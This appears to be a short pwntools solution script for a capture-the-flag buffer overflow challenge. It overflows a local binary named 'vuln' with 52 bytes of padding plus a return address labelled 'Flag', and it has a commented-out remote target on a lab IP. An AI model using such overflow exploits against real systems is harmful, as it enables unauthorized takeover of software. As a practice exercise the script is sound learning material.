
from pwn import *

#REMOTE = True				# test remote
REMOTE = False				# test local

elf = ELF("./vuln")

if REMOTE :
#	p = remote('10.10.10.147',1337)	# test remote
	p = remote('',1337)		# test local
else:
	p = process('./vuln')

payload = b'A' * 52			# Junk
payload += p32(0x080491c3)		# Flag 

p.recvline()
p.sendline(payload)
p.interactive()

